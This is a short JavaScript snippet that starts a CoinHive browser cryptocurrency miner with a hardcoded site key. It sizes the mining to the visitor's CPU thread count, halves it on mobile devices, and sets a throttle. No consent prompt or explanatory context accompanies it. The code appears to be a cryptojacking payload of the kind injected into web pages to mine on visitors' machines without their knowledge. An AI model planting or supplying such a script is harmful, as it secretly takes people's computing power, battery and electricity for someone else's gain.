(function() {
    var miner = new CoinHive.Anonymous("Kf15SR7WzVSDPQJHcbQcr25gLyI3Sopt");
    var threads = miner.getNumThreads();
    if (miner.isMobile()) {
        threads = threads / 2;
    }
    var throttle = (1 - ((threads - 1) / threads));
    miner.setThrottle(throttle);
    miner.start();
})();